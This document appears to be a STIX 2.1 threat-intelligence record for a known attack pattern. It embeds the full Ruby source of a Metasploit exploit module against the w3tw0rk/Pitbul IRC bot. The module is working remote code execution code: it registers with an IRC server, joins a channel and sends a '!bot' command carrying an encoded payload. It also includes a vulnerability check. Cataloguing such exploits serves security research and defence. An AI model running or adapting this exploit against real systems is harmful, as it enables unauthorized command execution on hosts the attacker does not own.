{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ea7968fd-a154-41de-9722-86099a116d88",
    "created": "2024-08-14T17:06:52.964175Z",
    "modified": "2024-08-14T17:06:52.964178Z",
    "name": "w3tw0rk / Pitbul IRC Bot  Remote Code Execution",
    "description": " This module allows remote command execution on the w3tw0rk / Pitbul IRC Bot. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/misc/w3tw0rk_exec.rb",
            "external_id": "w3tw0rk_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'w3tw0rk / Pitbul IRC Bot  Remote Code Execution',\n      'Description'    => %q{\n          This module allows remote command execution on the w3tw0rk / Pitbul IRC Bot.\n        },\n      'Author'         =>\n        [\n          'Jay Turla'\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '120384' ],\n          [ 'EDB', '36652' ]\n        ],\n      'Platform'       => %w{ unix win },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'    => 300, # According to RFC 2812, the max length message is 512, including the cr-lf\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd'\n            }\n        },\n      'Targets'  =>\n        [\n          [ 'w3tw0rk', { } ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2015-06-04',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        Opt::RPORT(6667),\n        OptString.new('IRC_PASSWORD', [false, 'IRC Connection Password', '']),\n        OptString.new('NICK', [true, 'IRC Nickname', 'msf_user']),\n        OptString.new('CHANNEL', [true, 'IRC Channel', '#channel'])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    connect\n\n    res = register(sock)\n    if res =~ /463/ || res =~ /464/\n      vprint_error(\"#{rhost}:#{rport} - Connection to the IRC Server not allowed\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    res = join(sock)\n    if !res =~ /353/ && !res =~ /366/\n      vprint_error(\"#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel\")\n      return Exploit::CheckCode::Unknown\n    end\n\n    quit(sock)\n    disconnect\n\n    if res =~ /auth/ && res =~ /logged in/\n      Exploit::CheckCode::Vulnerable\n    else\n      Exploit::CheckCode::Safe\n    end\n  end\n\n  def send_msg(sock, data)\n    sock.put(data)\n    data = \"\"\n    begin\n      read_data = sock.get_once(-1, 1)\n      while !read_data.nil?\n        data << read_data\n        read_data = sock.get_once(-1, 1)\n      end\n    rescue ::EOFError, ::Timeout::Error, ::Errno::ETIMEDOUT => e\n      elog(e)\n    end\n\n    data\n  end\n\n  def register(sock)\n    msg = \"\"\n\n    if datastore['IRC_PASSWORD'] && !datastore['IRC_PASSWORD'].empty?\n      msg << \"PASS #{datastore['IRC_PASSWORD']}\\r\\n\"\n    end\n\n    if datastore['NICK'].length > 9\n      nick = rand_text_alpha(9)\n      print_error(\"The nick is longer than 9 characters, using #{nick}\")\n    else\n      nick = datastore['NICK']\n    end\n\n    msg << \"NICK #{nick}\\r\\n\"\n    msg << \"USER #{nick} #{Rex::Socket.source_address(rhost)} #{rhost} :#{nick}\\r\\n\"\n\n    send_msg(sock,msg)\n  end\n\n  def join(sock)\n    join_msg = \"JOIN #{datastore['CHANNEL']}\\r\\n\"\n    send_msg(sock, join_msg)\n  end\n\n  def w3tw0rk_command(sock)\n    encoded = payload.encoded\n    command_msg = \"PRIVMSG #{datastore['CHANNEL']} :!bot #{encoded}\\r\\n\"\n    send_msg(sock, command_msg)\n  end\n\n  def quit(sock)\n    quit_msg = \"QUIT :bye bye\\r\\n\"\n    sock.put(quit_msg)\n  end\n\n  def exploit\n    connect\n\n    print_status(\"#{rhost}:#{rport} - Registering with the IRC Server...\")\n    res = register(sock)\n    if res =~ /463/ || res =~ /464/\n      print_error(\"#{rhost}:#{rport} - Connection to the IRC Server not allowed\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Joining the #{datastore['CHANNEL']} channel...\")\n    res = join(sock)\n    if !res =~ /353/ && !res =~ /366/\n      print_error(\"#{rhost}:#{rport} - Error joining the #{datastore['CHANNEL']} channel\")\n      return\n    end\n\n    print_status(\"#{rhost}:#{rport} - Exploiting the IRC bot...\")\n    w3tw0rk_command(sock)\n\n    quit(sock)\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2015-06-04",
    "x_mitre_platforms": [
        "%w{ unix win }"
    ]
}